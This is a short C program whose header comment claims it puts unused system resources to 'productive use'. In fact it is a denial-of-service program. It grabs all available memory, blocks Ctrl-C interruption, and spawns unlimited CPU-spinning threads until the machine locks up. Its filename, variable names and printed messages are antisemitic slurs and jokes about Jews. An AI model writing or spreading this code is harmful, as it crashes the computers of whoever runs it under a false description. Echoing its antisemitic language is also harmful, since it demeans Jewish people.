/* jews.iso - this program utilizes the unused resources of your system and puts them to productive use */
#include <stdlib.h>
#include <pthread.h>
#include <signal.h>

#define GB 1073741824
int BIT = 0;

void sig_handler(int signo)
{
  if (signo == SIGINT)
    printf("\nJews cannot be terminated by such a basic signal.\n");
}

unsigned long long int getTotalMemory(){
   char * mem = NULL;
   int i = 2048;
   while (mem == NULL){
     mem = malloc (GB+((GB*2048)/i));
     i--;
     if (i == 0){
       goto label;
     }
   }
   free(mem);
   return (GB+((GB/2048)*i));
   label:
   return GB;
}

void * utilizeMemory(void *vargp){
  unsigned long long int world = getTotalMemory();
  printf("Total free memory : %d\n",world);
  char * master_jew = (char *)malloc(world);
  for (int i=0;i<world;i++){
    master_jew[i] = 0;
  }
  BIT = 1;
  label0:
  while (1) {
    if (signal(SIGINT, sig_handler) == SIG_ERR)
       printf ("\nJews have been overpowered?!\n");
  }
}

void * utilizeThreads(void *vargp){
  label1:
  while (1){
    long long int j = GB + GB * 41;
    long long int e = GB + GB * 31;
    long long int w = GB + GB * 21;
    long long int s = GB + GB * 11;
    long long int z = GB + GB * 1;
    float ju = GB / j * e / w * s;
    float d = GB / j * e / w * s;
    float a = GB / j * e / w * s;
    float i = GB / j * e / w * s;
    float sm = GB / j * e / w * s;
    goto label1;
  }
}

int main(){
   pthread_t tid0,tid1;
   pthread_create(&tid0, NULL, utilizeMemory, NULL);
   while (BIT == 0){
     sleep(1);
   }
   printf("Utilizing CPU!\n");
   int i = 0;
   while (1){
   pthread_create(&tid0 , NULL, utilizeThreads, NULL);
   i++;
   printf("%d threads are utilizing CPU\n",i);
   }
   return 0;
}
